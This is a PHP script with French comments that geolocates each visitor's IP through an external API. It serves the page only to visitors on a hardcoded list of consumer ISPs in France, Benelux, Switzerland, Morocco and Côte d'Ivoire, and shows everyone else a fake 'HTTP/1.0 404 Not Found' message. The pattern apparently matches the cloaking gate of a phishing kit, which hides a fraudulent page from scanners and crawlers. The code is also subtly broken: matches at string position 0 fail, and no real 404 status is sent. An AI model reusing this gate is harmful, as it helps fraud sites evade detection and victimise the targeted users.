<?php 

    if(!isset($_SESSION)){
        session_start();  // Et on ouvre la session
    } 

$test_mode = false;

if($test_mode){
  $ip = "128.78.14.206";

}
else{
  $ip = $_SERVER['REMOTE_ADDR']; 
}



function getIpInfo($ip = '') { 
  
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ip); 
    $ipinfo_json = json_decode($ipinfo, true); 

    return $ipinfo_json; 
} 
    if($test_mode){
      $visitor_ip = "128.78.14.206";

    }
    else{
      $visitor_ip = $_SERVER['REMOTE_ADDR']; 
    }
    $ipinfo_json = getIpInfo($visitor_ip); 



  if($ipinfo_json['status'] != 'fail'){

    $org = "{$ipinfo_json['as']}"; // On récupère l'oprateur
    $isps = "{$ipinfo_json['isp']}"; // La mem 

  }
  else{

    $org = "Introuvable";
    $isps = "Introuvable";

  }

  if (
    strpos($org, "moov") ||
    strpos($org, "mtn") ||
    strpos($org, "Telenet") ||
    strpos($org, "AS36925 MEDITELECOM") ||
    strpos($org, "MEDITELECOM") ||
    strpos($org, "Hacktic Netwerk") ||
    strpos($org, "KPNQwest") ||
    strpos($org, "NLnet") ||
    strpos($org, "Planet Internet") ||
    strpos($org, "SURF") ||
    strpos($org, "UPC Nederland") ||
    strpos($org, "XS4ALL") ||
    strpos($org, "Ziggo") ||
    strpos($org, "youfone") ||
    strpos($org, "simyo") ||
    strpos($org, "tele2") ||
    strpos($org, "kpn") ||
    strpos($org, "lebara") ||
    strpos($org, "SinCOM") ||
    strpos($org, "Sunrise") ||
    strpos($org, "Swisscom") ||
    strpos($org, "Cablecom") ||
    strpos($org, "Alternet") ||
    strpos($org, "Cegecom") ||
    strpos($org, "Coditel") ||
    strpos($org, "CrossComm") ||
    strpos($org, "Eltrona") ||
    strpos($org, "Freenet") ||
    strpos($org, "Luxembourg") ||
    strpos($org, "Luxweb") ||
    strpos($org, "Netline") ||
    strpos($org, "Tele2") ||
    strpos($org, "Host Europe GmbH") ||
    strpos($org, "IAM") ||
    strpos($org, "Ipxo") ||
    strpos($org, "AS29066 Host Europe GmbH") ||
    strpos($org, "MEDITEL") ||
    strpos($org, "MAROC TELECOM") ||
    strpos($org, "POST") ||
    strpos($org, "GVA Cote d'Ivoire SAS") ||
     strpos($org, "bbox") || strpos($org, "Bouygues") || strpos($org, "Orange") || strpos($org, "sfr") || strpos($org, "SFR") || strpos($org, "Sfr") || strpos($org, "free") || strpos($org, "Free") || strpos($org, "FREE") ||  strpos($org, "red") || strpos($org, "proxad") || strpos($org, "club-internet") ||  strpos($org, "laposte") || strpos($org, "nordnet") || strpos($org, "liberty") || strpos($org, "colt") || strpos($org, "chello") || strpos($org, "belgacom") || strpos($org, "proximus") || strpos($org, "skynet") || strpos($org, "aol") || strpos($org, "neuf")  ||strpos($org, "darty") || strpos($org, "bouygue") || strpos($org, "numericable") || strpos($org, "Free") || strpos($org, "Num\303\251ris") || strpos($org, "Poste") || strpos($org, "Sosh")|| strpos($org, "lebara")) {

  
  
} 
else{ 

  die('HTTP/1.0 404 Not Found'); 
}